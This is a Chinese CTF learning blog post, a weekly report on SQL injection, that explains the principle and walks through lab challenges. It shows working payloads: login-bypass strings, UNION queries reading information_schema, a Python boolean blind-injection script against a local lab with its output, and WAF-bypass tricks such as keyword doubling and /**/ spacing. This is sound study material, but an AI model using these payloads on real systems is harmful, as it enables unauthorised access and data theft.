@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080b10">
+  
+  <title>2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm</title>
+  <meta name="description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="author" content="whymm">
+  <meta name="keywords" content="周报,SQL注入,CTF,Web">
+  <link rel="canonical" href="https://whymm.com.cn/2026/11/16/2026-week1-report/">
+  <link rel="alternate" type="application/atom+xml" title="2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm" href="/atom.xml">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm">
+  <meta property="og:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta property="og:site_name" content="whymm">
+  <meta property="og:url" content="https://whymm.com.cn/2026/11/16/2026-week1-report/">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:image" content="https://whymm.com.cn/img/og.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm">
+  
+  <meta property="article:published_time" content="2026-11-16T13:00:00.000Z">
+  <meta property="article:modified_time" content="2026-11-16T12:05:50.904Z">
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm">
+  <meta name="twitter:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="twitter:image" content="https://whymm.com.cn/img/og.png">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080b10'/%3E%3Cpath d='M8 21l4.2-11 3.8 8.2 3.8-8.2L24 21' stroke='%2335e0a1' stroke-width='2.6' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/post.css">
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('whymm-theme');
+        if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+      } catch (e) {}
+    })();
+  </script>
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="is-post">
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="progress" id="progressBar" aria-hidden="true"></div>
+  <header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark" aria-hidden="true">W</span>
+      <span class="brand-name">whymm</span>
+      <span class="brand-caret" aria-hidden="true">_</span>
+    </a>
+
+    <nav class="nav" id="siteNav" aria-label="主导航">
+      
+      <a class="nav-link" href="/">首页</a>
+      
+      <a class="nav-link" href="/archives/">归档</a>
+      
+      <a class="nav-link" href="/categories/">分类</a>
+      
+      <a class="nav-link" href="/tags/">标签</a>
+      
+      <a class="nav-link" href="/about/">关于</a>
+      
+    </nav>
+
+    <div class="header-actions">
+      
+      <button class="icon-btn" id="searchBtn" type="button" aria-label="搜索（Ctrl+K）">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      </button>
+      
+      
+      <button class="icon-btn theme-toggle" id="themeBtn" type="button" aria-label="切换明暗主题">
+        <svg class="i-moon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+      </button>
+      
+      <button class="icon-btn nav-btn" id="navBtn" type="button" aria-label="打开菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+  <main class="site-main">
+<article class="post">
+  <div class="wrap post-wrap">
+    <header class="post-header">
+      <div class="breadcrumb">
+        <a href="/">~</a>
+        <span>/</span>
+        
+        <a href="/categories/Web/">Web</a>
+        <span>/</span>
+        
+        <span class="breadcrumb-current">2026 级第一周周报：SQL 注入与几种 CTF 题型</span>
+      </div>
+      <h1 class="post-title">2026 级第一周周报：SQL 注入与几种 CTF 题型</h1>
+      <div class="post-meta">
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="5" width="17" height="16" rx="2.5"/><path d="M8 3v4M16 3v4M3.5 10h17"/></svg>
+          <time datetime="2026-11-16T13:00:00.000Z">2026-11-16</time>
+        </span>
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>
+          8 分钟阅读
+        </span>
+        <span class="post-meta-item">3188 字</span>
+        
+        <span class="post-meta-item" id="busuanzi_container_page_pv" style="display:none">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+          <span id="busuanzi_value_page_pv">0</span> 次阅读
+        </span>
+        
+        
+        <a class="chip chip-cat" href="/categories/Web/" style="--c: #ff7a45">Web</a>
+        
+      </div>
+    </header>
+
+    <div class="post-layout">
+      <div class="post-main">
+        
+        <details class="toc-mobile">
+          <summary>目录</summary>
+          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、SQL 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、SQL 注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%80%E4%BA%9B-SQL-%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="toc-text">三、一些 SQL 注入题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-UNION"><span class="toc-text">1 [数字型注入 + 报错回显 + UNION]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%9A%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">2 [登录框：万能密码]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3 [布尔盲注]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4-union-select-%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A%EF%BC%8C%E7%BB%95%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</span></a></li></ol></li></ol></div>
+        </details>
+        
+
+        <div class="post-content" id="postContent"><p>这一周基本都泡在 SQL 注入里：从最基础的登录绕过，到数字型注入用 UNION 拖库，再到关键词被 WAF 全删之后怎么绕，最后用布尔盲注一位一位把 flag 猜出来。这篇周报按「原理 → 题目 → 绕过 → 盲注」的顺序整理一遍，方便自己以后回看，也欢迎大佬指正。</p>
+<h2 id="一、SQL-核心原理"><a href="#一、SQL-核心原理" class="headerlink" title="一、SQL 核心原理"></a>一、SQL 核心原理</h2><p>SQL 注入是一种将恶意 SQL 代码插入用户输入并由数据库执行的攻击方式，可导致数据泄露、权限提升甚至删除数据库等严重后果。常见场景包括登录框、搜索框、URL 参数等，核心防御手段是使用参数化查询与严格输入验证。</p>
+<p><strong>SQL 注入的本质：用户输入的数据，被当作 SQL 语句的一部分执行。</strong></p>
+<p>一个例子：一个登录页面，后台 SQL 语句如下（简化版）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;用户输入&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;用户输入&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，我们可以通过输入账号与密码登入，但如果用户利用 sql 漏洞恶意输入 <code>&#39; or 1=1-- </code>，则后台变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27; and password=&#x27;随便输入&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>用户就能在不知道密码的情况下登录。</p>
+<p>解读：<code>--</code> 是 SQL 的注释符号，后面的内容会被注释掉，此时 SQL 语句等价于 <code>select * from user where username=&#39;&#39; or 1=1</code>，而 <code>1=1</code> 永远为真，所以会查询出所有用户信息，实现「免密码登录」—— 这就是最基础的 SQL 注入。</p>
+<p>当然还有许多其他的语法，这需要我们不断的积累。这里给一张常用的名词表：</p>
+<p><img src="/images/week1/01-schema-tables.png" alt="查库名 &#x2F; 表名 &#x2F; 字段名最常用的三张表"></p>
+<h2 id="二、SQL-注入的危害"><a href="#二、SQL-注入的危害" class="headerlink" title="二、SQL 注入的危害"></a>二、SQL 注入的危害</h2><ul>
+<li>数据泄露：获取用户信息、密码、订单等敏感数据。</li>
+<li>权限提升：读到后台账号、用 <code>into outfile</code> 写文件，进一步执行系统命令拿下服务器。</li>
+<li>数据篡改：<code>update</code>、<code>delete</code> 被打进去，整张表甚至整个库都可能被清掉。</li>
+<li>绕过业务逻辑：登录校验、支付金额、管理员权限判断，都可能被一句 <code>or 1=1</code> 直接跳过。</li>
+</ul>
+<h2 id="三、一些-SQL-注入题目"><a href="#三、一些-SQL-注入题目" class="headerlink" title="三、一些 SQL 注入题目"></a>三、一些 SQL 注入题目</h2><p>我按我认为的难度分了一下级。</p>
+<h3 id="1-数字型注入-报错回显-UNION"><a href="#1-数字型注入-报错回显-UNION" class="headerlink" title="1 [数字型注入 + 报错回显 + UNION]"></a>1 [数字型注入 + 报错回显 + UNION]</h3><p><strong>难度：拉玩了</strong></p>
+<p>先输一个空值看看报错，很多时候报错里会直接把后台语句打出来：</p>
+<p><img src="/images/week1/04-query-error.png" alt="id 传空值时，报错里直接打印了后台 SQL"></p>
+<p>第一步：确定列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> 数字</span><br></pre></td></tr></table></figure>
+
+<p>数字由小到大，当恰好出现错误时：</p>
+<p><img src="/images/week1/05-order-by.png" alt="ORDER BY 4 报 Unknown column &#39;4&#39; in &#39;order clause&#39;"></p>
+<p>此时数字为 4，这说明有 3 列。</p>
+<p>第二步：确定回显位</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>哪个数字输出则哪里为回显位（可打印数据的位置）：</p>
+<p><img src="/images/week1/06-union-echo.png" alt="union select 1,2,3 三个位置全部回显"></p>
+<p>这里都输出了则全部为回显位。</p>
+<p>第三步：把回显位换成要查的数据，按「库名 → 表名 → 字段名 → 具体数据」一层层往下查：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database(), <span class="number">3</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(table_name), <span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(column_name), <span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, username, email <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这一题的表里直接放着 flag，把第二个回显位换成 flag 所在字段即可：</p>
+<p><img src="/images/week1/07-union-flag.png" alt="ID &#x3D; 1 | 用户名 &#x3D; flag{...} | 邮箱 &#x3D; 3"></p>
+<h3 id="2-登录框：万能密码"><a href="#2-登录框：万能密码" class="headerlink" title="2 [登录框：万能密码]"></a>2 [登录框：万能密码]</h3><p><strong>难度：简单</strong></p>
+<p>最经典的场景：用户名和密码被直接拼进 SQL，没有做任何过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>先正常输入一组账号密码，回显 <code>Login failed</code>：</p>
+<p><img src="/images/week1/02-login-failed.png" alt="正常输入账号密码，回显 Login failed"></p>
+<p>再把用户名换成 <code>admin&#39; -- -</code>（密码随便填），回显 <code>Hello admin</code>：</p>
+<p><img src="/images/week1/03-login-bypass.png" alt="admin&#39; -- - 直接登录成功"></p>
+<p>原因就是上面讲的那个注释：<code>--</code> 把后面校验密码的部分注释掉了，语句变成 <code>select * from users where username=&#39;admin&#39;</code>，只要 admin 存在就直接登录。</p>
+<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3 [布尔盲注]"></a>3 [布尔盲注]</h3><p><strong>难度：有耐心就行</strong></p>
+<p>页面既没有回显位、也不报错，只剩「登录成功 &#x2F; 登录失败」两种状态时，就只能一位一位地把 flag 试出来。</p>
+<p>思路：从第一位开始，判断 <code>substr(flag, 1, 1)</code> 是不是某个字符，命中就把这一位拼到已知前缀上，再往后挪一位。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8092/index.php&quot;</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or substr((select flag from flag),%d,1)=&#x27;%s&#x27;#&quot;</span> % (pos, ch)</span><br><span class="line">        r = requests.get(url, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += ch</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;FLAG:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>
+
+<p>每命中一位就打印一次，所以能看到 flag 一点一点长出来：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;b</span><br><span class="line">flag&#123;bl</span><br><span class="line">flag&#123;bl1</span><br><span class="line">flag&#123;bl1n</span><br><span class="line">flag&#123;bl1nd</span><br><span class="line">flag&#123;bl1nd_</span><br><span class="line">flag&#123;bl1nd_1</span><br><span class="line">flag&#123;bl1nd_1s</span><br><span class="line">flag&#123;bl1nd_1s_</span><br><span class="line">flag&#123;bl1nd_1s_p</span><br><span class="line">flag&#123;bl1nd_1s_pa</span><br><span class="line">flag&#123;bl1nd_1s_pat</span><br><span class="line">flag&#123;bl1nd_1s_pat1</span><br><span class="line">flag&#123;bl1nd_1s_pat1e</span><br><span class="line">flag&#123;bl1nd_1s_pat1en</span><br><span class="line">flag&#123;bl1nd_1s_pat1ent</span><br><span class="line">flag&#123;bl1nd_1s_pat1ent&#125;</span><br><span class="line">FLAG: flag&#123;bl1nd_1s_pat1ent&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-过滤-union-select-空格-注释，绕关键词"><a href="#4-过滤-union-select-空格-注释，绕关键词" class="headerlink" title="4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]"></a>4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</h3><p><strong>难度：夯</strong></p>
+<p><img src="/images/week1/08-waf-rules.png" alt="WAF 规则：删关键词、删空白、删注释"></p>
+<p>我们看到许多关键词都被无效化了，这题可以用这些绕过方法。</p>
+<p><strong>① 关键词双写</strong></p>
+<p><code>union</code> → <code>ununionion</code>：删掉中间的 union 后，剩下 union。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union     → ununionion</span><br><span class="line">select    → seselectlect</span><br><span class="line">from      → frfromom</span><br><span class="line">where     → wwherehere</span><br></pre></td></tr></table></figure>
+
+<p><strong>② <code>/**/</code> 代替空格</strong></p>
+<p>MySQL 里 <code>/**/</code> 是注释，可以用来分隔 token；WAF 只删空白和 <code>--</code> &#x2F; <code>#</code>，不删它。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span>seselectlect<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>③ 词中词要特别注意</strong></p>
+<p><code>information_schema</code> 里含 <code>or</code>，会被删成 <code>infmation_schema</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infoorrmation_schema</span><br></pre></td></tr></table></figure>
+
+<p>后就可按照这个规则查出 flag。</p>
+<p>但之所以我认为这类题目难，是<strong>它每题规则不同，需要你自己摸索</strong>。</p>
+<hr>
+<p>最后我的报告就差不多结束了，如果有错误，请一定要指出来，我会及时更新。</p>
+</div>
+
+        
+        <div class="post-tags">
+          <span class="post-tags-label">#</span>
+          
+          <a class="chip" href="/tags/%E5%91%A8%E6%8A%A5/">周报</a>
+          
+          <a class="chip" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+          
+          <a class="chip" href="/tags/CTF/">CTF</a>
+          
+        </div>
+        
+
+        <div class="post-end">
+          <span class="post-end-line"></span>
+          <span class="post-end-text">EOF</span>
+          <span class="post-end-line"></span>
+        </div>
+
+        <nav class="post-nav">
+          <span class="post-nav-item is-empty"></span>
+          
+          <a class="post-nav-item post-nav-next" href="/2026/11/12/ssti-payload-playbook/">
+            <span class="post-nav-dir">下一篇 →</span>
+            <span class="post-nav-title">SSTI 从探测到 RCE：一份可复用的 payload 清单</span>
+          </a>
+          
+        </nav>
+
+        
+
+<section class="comments" id="comments">
+  <div class="comments-head">
+    <h2 class="comments-title"><span class="t-prompt">//</span> 评论</h2>
+    <span class="comments-sub">用 GitHub 账号登录后发言</span>
+  </div>
+  <div class="giscus-wrap">
+    <script src="https://giscus.app/client.js"
+      data-repo="whymm-fl/whymm-fl.github.io"
+      data-repo-id="R_kgDOVvROcA"
+      data-category="Announcements"
+      data-category-id="DIC_kwDOVvROcM4DLPtx"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="dark"
+      data-lang="zh-CN"
+      crossorigin="anonymous"
+      async>
+    </script>
+  </div>
+</section>
+
+
+      </div>
+
+      
+      <aside class="post-aside">
+        <div class="toc-wrap">
+          <div class="toc-title"><span>目录</span><b>TOC</b></div>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、SQL 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、SQL 注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%80%E4%BA%9B-SQL-%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="toc-text">三、一些 SQL 注入题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-UNION"><span class="toc-text">1 [数字型注入 + 报错回显 + UNION]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%9A%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">2 [登录框：万能密码]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3 [布尔盲注]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4-union-select-%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A%EF%BC%8C%E7%BB%95%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</span></a></li></ol></li></ol>
+        </div>
+      </aside>
+      
+    </div>
+  </div>
+</article>
+</main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-about">
+        <div class="footer-brand">whymm<span class="caret">_</span></div>
+        <p class="footer-motto">Stay curious, keep pwning.</p>
+      </div>
+      <div class="footer-nav">
+        <div class="footer-nav-col">
+          <div class="footer-label">// 导航</div>
+          
+          <a href="/">首页</a>
+          
+          <a href="/archives/">归档</a>
+          
+          <a href="/categories/">分类</a>
+          
+          <a href="/tags/">标签</a>
+          
+          <a href="/about/">关于</a>
+          
+        </div>
+        <div class="footer-nav-col">
+          <div class="footer-label">// 联系</div>
+          
+          <a href="https://github.com/whymm-fl" target="_blank" rel="noopener">GitHub</a>
+          
+          
+          <a href="/atom.xml">RSS 订阅</a>
+          <a href="/sitemap.xml">站点地图</a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <span>© 2026 whymm</span>
+      <span class="dot-sep">·</span>
+      <span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a></span>
+      <span class="dot-sep">·</span>
+      <span>Theme <b>whymm</b></span>
+      
+      <span class="footer-stats" id="busuanzi_container_site_pv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_pv">0</span> 次访问</span>
+      <span class="footer-stats" id="busuanzi_container_site_uv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_uv">0</span> 位访客</span>
+      
+    </div>
+  </div>
+</footer>
+
+  <div class="search-layer" id="searchLayer" aria-hidden="true">
+  <div class="search-backdrop" data-close="search"></div>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-head">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      <input id="searchInput" type="search" placeholder="搜索标题、分类、标签或正文…" autocomplete="off" spellcheck="false" data-search-url="/search.json">
+      <button class="search-close" type="button" data-close="search" aria-label="关闭">ESC</button>
+    </div>
+    <div class="search-body" id="searchResults">
+      <div class="search-empty">
+        <div class="search-empty-icon">⌘K</div>
+        <p>输入关键词开始搜索</p>
+        <span>支持标题、分类、标签与正文全文匹配</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <button class="to-top" id="toTop" type="button" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+  </button>
+  <div class="img-viewer" id="imgViewer" aria-hidden="true"><img alt=""></div>
+  <script src="/js/main.js" defer></script>
+  <script src="/js/search.js" defer></script>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</body>
+</html>
